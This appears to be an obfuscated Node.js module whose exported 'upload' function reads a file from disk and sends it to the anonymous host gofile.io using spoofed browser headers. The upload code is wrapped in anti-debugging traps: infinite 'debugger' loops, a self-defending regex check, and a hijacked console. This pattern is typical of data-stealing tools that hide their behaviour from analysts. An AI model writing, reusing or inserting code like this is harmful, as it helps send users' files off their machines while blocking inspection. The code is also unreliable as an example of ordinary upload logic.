const _0x1180b7 = (function () {
    let _0x507149 = true
    return function (_0x3aa3c1, _0x14494b) {
      const _0x4ca733 = _0x507149
        ? function () {
            if (_0x14494b) {
              const _0xff21d3 = _0x14494b.apply(_0x3aa3c1, arguments)
              return (_0x14494b = null), _0xff21d3
            }
          }
        : function () {}
      return (_0x507149 = false), _0x4ca733
    }
  })(),
  _0x1bc733 = _0x1180b7(this, function () {
    return _0x1bc733
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x1bc733)
      .search('(((.+)+)+)+$')
  })
_0x1bc733()
const _0x2fe19f = (function () {
  let _0x3c9c12 = true
  return function (_0x906ea, _0x4a3f64) {
    const _0x160600 = _0x3c9c12
      ? function () {
          if (_0x4a3f64) {
            const _0x3c87fa = _0x4a3f64.apply(_0x906ea, arguments)
            return (_0x4a3f64 = null), _0x3c87fa
          }
        }
      : function () {}
    return (_0x3c9c12 = false), _0x160600
  }
})()
;(function () {
  _0x2fe19f(this, function () {
    const _0x29f44c = new RegExp('function *\\( *\\)'),
      _0x319878 = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
      _0x4860a6 = _0x27651e('init')
    !_0x29f44c.test(_0x4860a6 + 'chain') || !_0x319878.test(_0x4860a6 + 'input')
      ? _0x4860a6('0')
      : _0x27651e()
  })()
})()
const _0x17b2e2 = (function () {
    let _0x5593b7 = true
    return function (_0x10dfd2, _0x1d821b) {
      const _0x2dd607 = _0x5593b7
        ? function () {
            if (_0x1d821b) {
              const _0x26d0f0 = _0x1d821b.apply(_0x10dfd2, arguments)
              return (_0x1d821b = null), _0x26d0f0
            }
          }
        : function () {}
      return (_0x5593b7 = false), _0x2dd607
    }
  })(),
  _0x8abfc = _0x17b2e2(this, function () {
    const _0x45018f = function () {
      let _0x2d07d2
      try {
        _0x2d07d2 = Function(
          'return (function() {}.constructor("return this")( ));'
        )()
      } catch (_0x4c6fc9) {
        _0x2d07d2 = window
      }
      return _0x2d07d2
    }
    const _0x1c67cb = _0x45018f()
    const _0x22296a = (_0x1c67cb.console = _0x1c67cb.console || {}),
      _0x1cd464 = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (let _0x66aa21 = 0; _0x66aa21 < _0x1cd464.length; _0x66aa21++) {
      const _0x23d767 = _0x17b2e2.constructor.prototype.bind(_0x17b2e2),
        _0x4b07ae = _0x1cd464[_0x66aa21],
        _0x3c99ae = _0x22296a[_0x4b07ae] || _0x23d767
      _0x23d767['__proto__'] = _0x17b2e2.bind(_0x17b2e2)
      _0x23d767.toString = _0x3c99ae.toString.bind(_0x3c99ae)
      _0x22296a[_0x4b07ae] = _0x23d767
    }
  })
_0x8abfc()
const _0x1f0c32 = require('fs')
const _0x13ff1e = require('form-data'),
  _0x20f8e5 = require('axios')
async function _0x5c4e9b(_0x1a9d79) {
  const _0x4e0b52 = await _0x268d08(),
    _0x1dbbde = await _0x464939(_0x1a9d79, _0x4e0b52)
  return _0x1dbbde
}
async function _0x268d08() {
  const _0x5a7e9c = await _0x20f8e5({
    url: 'https://apiv2.gofile.io/getServer',
    method: 'GET',
    headers: {
      accept: '*/*',
      'accept-language': 'en-US,en;',
      'cache-control': 'no-cache',
      pragma: 'no-cache',
      referrer: 'https://gofile.io/uploadFiles',
      mode: 'cors',
      'user-agent':
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/85.0.564.44',
      dnt: 1,
      origin: 'https://gofile.io',
    },
  })
  if (_0x5a7e9c.data.status !== 'ok') {
    throw new Error(
      'Fetching server info failed: ' + JSON.stringify(_0x5a7e9c.data)
    )
  }
  return _0x5a7e9c.data.data.server
}
async function _0x464939(_0x4c33cc, _0x1000d2) {
  const _0x2ad596 = new _0x13ff1e()
  _0x2ad596.append('file', _0x1f0c32.createReadStream(_0x4c33cc))
  const _0x12c5ef = await _0x20f8e5({
    url: 'https://' + _0x1000d2 + '.gofile.io/uploadFile',
    method: 'POST',
    headers: {
      accept: '*/*',
      'accept-language': 'en-US,en;',
      'cache-control': 'no-cache',
      pragma: 'no-cache',
      referrer: 'https://gofile.io/uploadFiles',
      mode: 'cors',
      'user-agent':
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/85.0.564.44',
      dnt: 1,
      origin: 'https://gofile.io',
      ..._0x2ad596.getHeaders(),
    },
    maxContentLength: Infinity,
    maxBodyLength: Infinity,
    referrer: 'https://gofile.io/uploadFiles',
    data: _0x2ad596,
  })
  if (_0x12c5ef.data.status !== 'ok') {
    throw new Error('Uploading file failed: ' + JSON.stringify(_0x12c5ef.data))
  }
  return _0x12c5ef.data.data.downloadPage
}
module.exports = { upload: _0x5c4e9b }
function _0x27651e(_0x2b2ac8) {
  function _0x165c6f(_0x4540f6) {
    if (typeof _0x4540f6 === 'string') {
      return function (_0x1efdb5) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x4540f6 / _0x4540f6).length !== 1 || _0x4540f6 % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    _0x165c6f(++_0x4540f6)
  }
  try {
    if (_0x2b2ac8) {
      return _0x165c6f
    } else {
      _0x165c6f(0)
    }
  } catch (_0x200e0c) {}
}
